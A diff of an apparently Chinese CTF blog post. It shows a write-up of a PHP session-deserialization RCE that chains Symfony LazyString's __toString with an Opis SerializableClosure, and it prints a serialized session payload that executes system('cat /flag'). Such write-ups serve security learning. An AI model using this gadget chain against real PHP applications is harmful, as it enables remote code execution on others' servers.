+<p><a class="lightgallery" href="https://img-blog.csdnimg.cn/d628cc1bba3545c1be887421822e90f2.png" title="在这里插入图片描述" data-thumbnail="https://img-blog.csdnimg.cn/d628cc1bba3545c1be887421822e90f2.png">
+        <img
+            class="lazyload"
+            data-src="https://img-blog.csdnimg.cn/d628cc1bba3545c1be887421822e90f2.png"
+            data-srcset="https://img-blog.csdnimg.cn/d628cc1bba3545c1be887421822e90f2.png, https://img-blog.csdnimg.cn/d628cc1bba3545c1be887421822e90f2.png 1.5x, https://img-blog.csdnimg.cn/d628cc1bba3545c1be887421822e90f2.png 2x"
+            data-sizes="auto"
+            alt="https://img-blog.csdnimg.cn/d628cc1bba3545c1be887421822e90f2.png">
+    </a></p>
 <p>那么我们就是可以操控session文件了，所以我们现在的目的就是怎么去构造一个session文件去rce
 可以看到index.php里面session拼接了：<code> $_SESSION[&quot;upload_path&quot;].&quot;/&quot;.$_POST['path'];</code>
 所以如果<code> $_SESSION[&quot;upload_path&quot;]</code>是一个对象的话，那就会触发一个__toString方法了
 那么我们就去找一个可以利用的__toString方法，这里是可以利用的在LazyString这里找到利用的方法</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://img-blog.csdnimg.cn/3108d16f83294fecb5eb4cd68d4e1bcd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
-        data-srcset="https://img-blog.csdnimg.cn/3108d16f83294fecb5eb4cd68d4e1bcd.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/3108d16f83294fecb5eb4cd68d4e1bcd.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/3108d16f83294fecb5eb4cd68d4e1bcd.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
-        data-sizes="auto"
-        alt="https://img-blog.csdnimg.cn/3108d16f83294fecb5eb4cd68d4e1bcd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
-        title="在这里插入图片描述" /></p>
+<p><a class="lightgallery" href="https://img-blog.csdnimg.cn/3108d16f83294fecb5eb4cd68d4e1bcd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16" title="在这里插入图片描述" data-thumbnail="https://img-blog.csdnimg.cn/3108d16f83294fecb5eb4cd68d4e1bcd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16">
+        <img
+            class="lazyload"
+            data-src="https://img-blog.csdnimg.cn/3108d16f83294fecb5eb4cd68d4e1bcd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+            data-srcset="https://img-blog.csdnimg.cn/3108d16f83294fecb5eb4cd68d4e1bcd.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/3108d16f83294fecb5eb4cd68d4e1bcd.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/3108d16f83294fecb5eb4cd68d4e1bcd.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+            data-sizes="auto"
+            alt="https://img-blog.csdnimg.cn/3108d16f83294fecb5eb4cd68d4e1bcd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16">
+    </a></p>
 <p>再看到这个组件，opis/closure，可序列化闭包，那么我们就可以通过创建一个攻击性的闭包去反序列化，这样完成我们的攻击
 那么如此，我们就可以构造我们的exp了</p>
 <div class="highlight"><div class="chroma">
@@ -323,48 +341,52 @@
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">upload_path</span><span class="o">|</span><span class="nx">O</span><span class="o">:</span><span class="mi">35</span><span class="o">:</span><span class="s2">&#34;Symfony\Component\String\LazyString&#34;</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">42</span><span class="o">:</span><span class="s2">&#34;%00Symfony\Component\String\LazyString%00value&#34;</span><span class="p">;</span><span class="nx">C</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="s2">&#34;Opis\Closure\SerializableClosure&#34;</span><span class="o">:</span><span class="mi">157</span><span class="o">:</span><span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">&#34;use&#34;</span><span class="p">;</span><span class="nx">a</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}</span><span class="nx">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">&#34;function&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">34</span><span class="o">:</span><span class="s2">&#34;function() {\system(&#34;</span><span class="nx">cat</span> <span class="o">/</span><span class="nx">flag</span><span class="s2">&#34;);}&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;scope&#34;</span><span class="p">;</span><span class="nx">N</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;this&#34;</span><span class="p">;</span><span class="nx">N</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;self&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="s2">&#34;0000000045e636f7000000007352e912&#34;</span><span class="p">;}}}</span>
 </code></pre></td></tr></table>
 </div>
-</div><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://img-blog.csdnimg.cn/88a2f5b18f02475e8a764f21e9781eea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
-        data-srcset="https://img-blog.csdnimg.cn/88a2f5b18f02475e8a764f21e9781eea.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/88a2f5b18f02475e8a764f21e9781eea.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/88a2f5b18f02475e8a764f21e9781eea.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
-        data-sizes="auto"
-        alt="https://img-blog.csdnimg.cn/88a2f5b18f02475e8a764f21e9781eea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
-        title="在这里插入图片描述" /></p>
+</div><p><a class="lightgallery" href="https://img-blog.csdnimg.cn/88a2f5b18f02475e8a764f21e9781eea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16" title="在这里插入图片描述" data-thumbnail="https://img-blog.csdnimg.cn/88a2f5b18f02475e8a764f21e9781eea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16">
+        <img
+            class="lazyload"
+            data-src="https://img-blog.csdnimg.cn/88a2f5b18f02475e8a764f21e9781eea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+            data-srcset="https://img-blog.csdnimg.cn/88a2f5b18f02475e8a764f21e9781eea.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/88a2f5b18f02475e8a764f21e9781eea.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/88a2f5b18f02475e8a764f21e9781eea.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+            data-sizes="auto"
+            alt="https://img-blog.csdnimg.cn/88a2f5b18f02475e8a764f21e9781eea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16">
+    </a></p>
 <p>再次上传文件，利用session去拼接调用__toString方法，成功rce</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://img-blog.csdnimg.cn/0fffc8f42fc54f519e72a8611e9e1c43.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
-        data-srcset="https://img-blog.csdnimg.cn/0fffc8f42fc54f519e72a8611e9e1c43.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/0fffc8f42fc54f519e72a8611e9e1c43.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/0fffc8f42fc54f519e72a8611e9e1c43.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
-        data-sizes="auto"
-        alt="https://img-blog.csdnimg.cn/0fffc8f42fc54f519e72a8611e9e1c43.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
-        title="在这里插入图片描述" /></p>
-<h1 id="预期解">预期解</h1>
-<p>看了作者给的wp，发现预期解是通过__sleep方法去调用__toString方法的</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://img-blog.csdnimg.cn/c40530e72fb84051a0e4d17f03d676c5.png"
-        data-srcset="https://img-blog.csdnimg.cn/c40530e72fb84051a0e4d17f03d676c5.png, https://img-blog.csdnimg.cn/c40530e72fb84051a0e4d17f03d676c5.png 1.5x, https://img-blog.csdnimg.cn/c40530e72fb84051a0e4d17f03d676c5.png 2x"
-        data-sizes="auto"
-        alt="https://img-blog.csdnimg.cn/c40530e72fb84051a0e4d17f03d676c5.png"
-        title="在这里插入图片描述" /></p>
+<p><a class="lightgallery" href="https://img-blog.csdnimg.cn/0fffc8f42fc54f519e72a8611e9e1c43.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16" title="在这里插入图片描述" data-thumbnail="https://img-blog.csdnimg.cn/0fffc8f42fc54f519e72a8611e9e1c43.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16">
+        <img
+            class="lazyload"
+            data-src="https://img-blog.csdnimg.cn/0fffc8f42fc54f519e72a8611e9e1c43.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+            data-srcset="https://img-blog.csdnimg.cn/0fffc8f42fc54f519e72a8611e9e1c43.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/0fffc8f42fc54f519e72a8611e9e1c43.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/0fffc8f42fc54f519e72a8611e9e1c43.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+            data-sizes="auto"
+            alt="https://img-blog.csdnimg.cn/0fffc8f42fc54f519e72a8611e9e1c43.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16">
+    </a></p>
+<h1 id="预期解" class="headerLink">
+    <a href="#%e9%a2%84%e6%9c%9f%e8%a7%a3" class="header-mark"></a>预期解</h1><p>看了作者给的wp，发现预期解是通过__sleep方法去调用__toString方法的</p>
+<p><a class="lightgallery" href="https://img-blog.csdnimg.cn/c40530e72fb84051a0e4d17f03d676c5.png" title="在这里插入图片描述" data-thumbnail="https://img-blog.csdnimg.cn/c40530e72fb84051a0e4d17f03d676c5.png">
+        <img
+            class="lazyload"
+            data-src="https://img-blog.csdnimg.cn/c40530e72fb84051a0e4d17f03d676c5.png"
+            data-srcset="https://img-blog.csdnimg.cn/c40530e72fb84051a0e4d17f03d676c5.png, https://img-blog.csdnimg.cn/c40530e72fb84051a0e4d17f03d676c5.png 1.5x, https://img-blog.csdnimg.cn/c40530e72fb84051a0e4d17f03d676c5.png 2x"
+            data-sizes="auto"
+            alt="https://img-blog.csdnimg.cn/c40530e72fb84051a0e4d17f03d676c5.png">
+    </a></p>
 <p>而php原生的session执行反序列化的时候，的确会调用__sleep方法</p>
-<h1 id="思路">思路</h1>
-<p>这道题的整个的思路就是：</p>
+<h1 id="思路" class="headerLink">
+    <a href="#%e6%80%9d%e8%b7%af" class="header-mark"></a>思路</h1><p>这道题的整个的思路就是：</p>
 <ul>
 <li>首先测试到上传的文件可以进行目录穿越，但是只有tmp目录有权限</li>
 <li>源码中观察到闭包反序列化组件，方向可能是反序列化，执行composer update安装源码</li>
 <li>有session的使用，可以上传文件到tmp，而且有session的使用，而且phpinfo中有写是file，所以考虑到是session反序列化</li>
 <li>构造闭包去序列化打rce</li>
 </ul>
-</div><div class="post-footer" id="post-footer">
+</div>
+
+        <div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
                 <span>更新于 2022-02-13</span>
-            </div></div>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
@@ -380,20 +402,26 @@
         </section>
     </div>
 
-    <div class="post-nav"><a href="/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="prev" rel="prev" title="[代码审计]信呼OA2.3.1版本代码审计"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>[代码审计]信呼OA2.3.1版本代码审计</a>
-            <a href="/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/" class="next" rel="next" title="[Java安全]反射">[Java安全]反射<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+    <div class="post-nav"><a href="/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="prev" rel="prev" title="[代码审计]信呼OA2.3.1版本代码审计"><i class="fas fa-angle-left fa-fw"></i>[代码审计]信呼OA2.3.1版本代码审计</a>
+            <a href="/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/" class="next" rel="next" title="[Java安全]反射">[Java安全]反射<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 </article></div>
-            </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">2022</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Huamang</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">2022</div><div class="footer-line"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Huamang</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                     <span class="icp"><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021001334号</a></span></div>
-        </div>
-    </footer></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
 
-        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
-                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
-                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
-            </a>
-        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.0/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.11.0/dist/algoliasearch.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/topbar@1.0.1/topbar.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@sliphua/pjax@2.4.0/dist/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+
+<div class="pjax-assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js"></script></div>
+</body>
+
 </html>
